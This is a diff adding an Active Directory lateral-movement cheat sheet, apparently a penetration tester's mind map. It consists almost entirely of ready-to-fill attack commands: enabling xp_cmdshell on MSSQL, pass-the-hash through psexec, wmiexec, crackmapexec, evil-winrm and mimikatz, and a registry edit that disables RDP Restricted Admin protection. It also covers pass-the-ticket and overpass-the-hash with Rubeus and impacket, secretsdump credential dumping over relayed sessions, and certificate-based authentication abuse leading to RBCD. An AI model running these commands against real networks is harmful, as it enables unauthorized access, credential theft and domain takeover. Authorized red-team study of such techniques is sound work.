@@ -1,0 +1,152 @@
+### Lateral Move
+
+WSUSpect
+	WSUSpendu.ps1 # need compromised WSUS server
+
+sccm admin
+	abuse sccm
+		CMPivot
+		PowerSCCM
+		SharpSCCM
+		Administrator access
+
+MSSQL
+	find mssql access
+		cme mssql <ip> -u <user> -p <password> -d <domain>
+	Users with SQLadmin
+		MATCH p=(u:User)-[:SQLAdmin]->(c:Computer) RETURN p
+	EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
+		EXECUTE sp_configure 'xp_cmdshell', 1;  RECONFIGURE;
+			EXEC xp_cmdshell '<cmd>'
+			Low Access
+	trust link
+		Get-SQLServerLinkCrawl -username <user> -password <pass> -Verbose -Instance <sql_instance> -Query "<query>"
+		use exploit/windows/mssql/mssql_linkcrawler
+		MSSQL
+	mssqlclient.py -windows-auth <domain>/<user>:<password>@<ip> (pr #1397)
+		enum_db
+		enable_xp_cmdshell
+			xp_cmdshell <cmd>
+			Low Access
+		enum_impersonate
+			exec_as_user <user>
+			exec_as_login <login>
+			MSSQL
+		xp_dir_tree <ip>
+		trustlink
+			sp_linkedservers
+				use_link
+				MSSQL
+		coerce  SMB ->
+
+Local User
+	cme smb -u <user> -p <pass>' <ip> --local-auth
+	impacket like cleartext pasword without domain/
+	Administrator access
+
+Password
+	Cleartext password
+		interactive-shell
+			psexec.py <domain>/<user>:<password>@<ip>
+			psexec.exe -AcceptEULA \\<ip>
+			mimikatz "privilege::debug sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash>"
+		pseudo-shell (file write and read)
+			atexec.py  <domain>/<user>:<password>@<ip> "command"
+			smbexec.py  <domain>/<user>:<password>@<ip>
+			wmiexec.py  <domain>/<user>:<password>@<ip>
+			dcomexec.py  <domain>/<user>:<password>@<ip>
+			crackmapexec smb <ip_range> -u <user> -p <password> -d <domain>
+			crackmapexec smb <ip_range> -u <user> -p <password> -local-auth
+			Authority/sytem
+		WinRM
+			evil-winrm -i <ip> -u <user> -p <password>
+		RDP
+			xfreerdp /u:<user> /d:<domain> /p:<password> /v:<ip>
+		SMB
+			smbclient.py <domain>/<user>:<password>@<ip>
+				search files
+		MSSQL
+			crackmapexec mssql <ip_range> -u <user> -p <password>
+			mssqlclient.py -windows-auth <domain>/<user>:<password>@<ip>
+			MSSQL
+NTLM Hash
+	🔥 Pass the hash (PTH)
+		interactive-shell
+			psexec.py -hashes ":<hash>" <user>@<ip>
+			psexec.exe -AcceptEULA \\<ip>
+			mimikatz "privilege::debug sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash>"
+			Authority/sytem
+		pseudo-shell (file write and read)
+			atexec.py -hashes ":<hash>" <user>@<ip> "command"
+			smbexec.py -hashes ":<hash>" <user>@<ip>
+			wmiexec.py -hashes ":<hash>" <user>@<ip>
+			dcomexec.py -hashes ":<hash>" <user>@<ip>
+			crackmapexec smb <ip_range> -u <user> -d <domain> -H ':<hash>'
+			crackmapexec smb <ip_range>  -u <user> -H ':<hash>' --local-auth
+			Authority/sytem
+		WinRM
+			evil-winrm -i <ip> -u <user> -H <hash>
+		RDP
+			reg.py <domain>/<user>@<ip> -hashes ':<hash>' add -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' -v 'DisableRestrictedAdmin' -vt 'REG_DWORD' -vd '0'
+				xfreerdp /u:<user> /d:<domain> /pth:<hash> /v:<ip>
+		SMB
+			smbclient.py  -hashes ":<hash>" <user>@<ip>
+				search files
+		MSSQL
+			crackmapexec mssql <ip_range> -H ':<hash>'
+			mssqlclient.py -windows-auth -hashes ":<hash>" <domain>/<user>@<ip> 
+			MSSQL
+	overpass the hash / pass the key (PTK)
+		Rubeus asktgt /user:victim /rc4:<rc4value>
+			Rubeus ptt /ticket:<ticket>
+			Rubeus createnetonly /program:C:\Windows\System32\[cmd.exe||upnpcont.exe]
+				Rubeus ptt /luid:0xdeadbeef /ticket:<ticket>
+		getTGT.py <domain>/<user> -hashes :<hashes>
+		getTGT.py -aesKey '<key>' <domain>/<user>@<ip>
+
+Kerberos
+	Pass the ticket (ccache / kirbi)
+		Convert format
+			ticketConverter.py <kirbi||ccache> <ccache||kirbi>
+		export KRB5CCNAME=/root/impacket-examples/domain_ticket.ccache
+			impacket tools: Same as Pass the hash but use : -k and -no-pass for impacket
+		mimikatz kerberos::ptc "<ticket>"
+		Rubeus.exe ptt /ticket:<ticket>
+		proxychains secretsdump -k'<domain>'/'<user>'@'<ip>'
+		modify SPN
+			tgssub.py -in <ticket.ccache> -out <newticket.ccache> -altservice "<service>/<target>"  #pr 1256
+			Pass the Ticket
+		Administrator access
+		see dcsync
+
+	aesKey
+		impacket tools: Same as Pass the hash but use : -aesKey for impacket (and use FQDN)
+		proxychains secretsdump -aesKey <key> '<domain>'/'<user>'@'<ip>'
+		see dcsync
+		Administrator access
+
+Socks (with NTLM relay)
+	proxychains lookupsid.py <domain>/<user>@<ip> -no-pass -domain-sids
+	proxychains mssqlclient.py -windows-auth <domain>/<user>@<ip> -no-pass
+	proxychains secretsdump -no-pass '<domain>'/'<user>'@'<ip>'
+	pseudo-shell (file write and read)
+		proxychains atexec.py  -no-pass  <domain>/<user>@<ip> "command"
+		proxychains smbexec.py  -no-pass  <domain>/<user>@<ip>
+		Authority/sytem
+	proxychains smbclient.py -no-pass <user>@<ip>
+		search files
+
+Certificate (pfx)
+	get hash NTLM from certificate
+		certipy auth -pfx <crt_file> -dc-ip <dc_ip> ⇒ NTLM hash
+	Pass the Certificate
+		pkinit
+			 gettgtpkinit.py -cert-pfx "<pfx_file>" ^[-pfx-pass  "<cert-password>"] "<fqdn_domain>/<user>" "<tgt_ccache_file>"
+			Rubeus.exe asktgt /user:"<username>" /certificate:"<pfx_file>" [/password:"<certificate_password>"] /domain:"<fqdn-domain>" /dc:"<dc>" /show
+			certipy auth -pfx <crt_file> -dc-ip <dc_ip>
+		Schannel
+			certipy auth -pfx <crt_file> -ldap-shell
+				add_computer
+					set_rbcd
+					RBCD
+
